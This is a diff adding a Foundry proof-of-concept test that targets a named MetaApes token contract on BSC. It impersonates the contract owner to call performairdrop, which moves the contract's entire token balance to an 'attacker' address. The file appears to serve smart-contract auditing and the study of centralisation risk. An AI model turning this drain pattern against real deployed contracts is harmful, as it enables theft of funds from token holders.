@@ -1,0 +1,49 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IMetaApes {
+    function getOwner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function performairdrop(
+        address from,
+        address[] calldata addresses,
+        uint256[] calldata tokens
+    ) external;
+}
+
+contract ExploitTest is Test {
+    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
+    address attacker = address(this);
+
+    function setUp() public {
+        vm.label(TARGET, "MetaApesBSC");
+    }
+
+    function testOwnerPrivilegeAirdrop() public {
+        // Get the current owner of the MetaApes contract
+        address owner = IMetaApes(TARGET).getOwner();
+        vm.label(owner, "Owner");
+
+        // Ensure the contract itself holds some tokens (from fees)
+        uint256 contractBalance = IMetaApes(TARGET).balanceOf(TARGET);
+        require(contractBalance > 0, "Contract has no tokens to steal");
+
+        // Prepare arrays for the airdrop: send all contract tokens to attacker
+        address[] memory recipients = new address[](1);
+        recipients[0] = attacker;
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = contractBalance;
+
+        // Owner (or any authorized) calls performairdrop to drain contract tokens
+        vm.prank(owner);
+        IMetaApes(TARGET).performairdrop(TARGET, recipients, amounts);
+
+        // Verify attacker now holds the stolen tokens
+        uint256 attackerBalance = IMetaApes(TARGET).balanceOf(attacker);
+        assertEq(attackerBalance, contractBalance, "Attacker did not receive tokens");
+    }
+}
+```
